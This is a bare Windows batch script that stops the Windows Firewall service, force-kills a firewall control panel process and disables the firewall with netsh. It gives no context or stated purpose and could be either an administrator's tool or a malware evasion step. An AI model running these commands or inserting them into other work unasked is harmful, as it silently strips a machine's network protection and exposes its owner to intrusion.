@echo off
net stop MpsSvc
taskkill /f /t /im FirewallControlPanel.exe
netsh firewall set opmode disable
exit
